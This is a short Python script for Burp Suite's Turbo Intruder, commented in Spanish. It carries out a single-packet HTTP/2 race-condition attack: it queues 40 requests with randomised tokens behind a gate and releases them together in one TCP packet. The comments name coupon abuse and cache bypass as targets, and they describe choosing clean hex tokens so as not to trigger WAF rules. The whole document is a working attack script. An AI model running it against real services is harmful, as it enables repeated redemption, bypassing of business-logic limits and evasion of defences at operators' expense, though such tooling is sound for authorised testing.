import secrets

def queueRequests(target, wordlist):
    # Motor de alto rendimiento con HTTP/2 forzado
    # concurrentConnections=1 es OBLIGATORIO para Single-Packet Attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.HTTP2
                           )

    # Marcador universal que debes poner en tu petición de Burp
    # Ejemplo: {"coupon": "PROMO", "cache_bypass": "RACE_CONDITION"}
    MARKER = "RACE_CONDITION"
    
    # Cantidad de intentos en la carrera (30-50 es lo ideal para la mayoría de servidores)
    num_attempts = 40 

    for i in range(num_attempts):
        # Generamos un token hex aleatorio y limpio (sin % ni $)
        # Esto evita activar reglas de 'Format String' o 'WAF'
        token = secrets.token_hex(4)
        
        # Sustitución manual: El script busca 'RACE_CONDITION' y lo cambia por el token
        # Esto permite que el script funcione en cualquier cabecera o cuerpo
        current_request = target.req.replace(MARKER, token)
        
        # Encolamos la petición bajo la misma 'compuerta' (gate)
        engine.queue(current_request, gate='sync_race')

    # DISPARO ATÓMICO: Libera todas las peticiones en un solo paquete TCP
    engine.openGate('sync_race')

def handleResponse(req, interesting):
    # Esta función organiza los resultados en la tabla de Burp
    # Añadimos todas para comparar Status, Length y Time (Latencia)
    table.add(req)
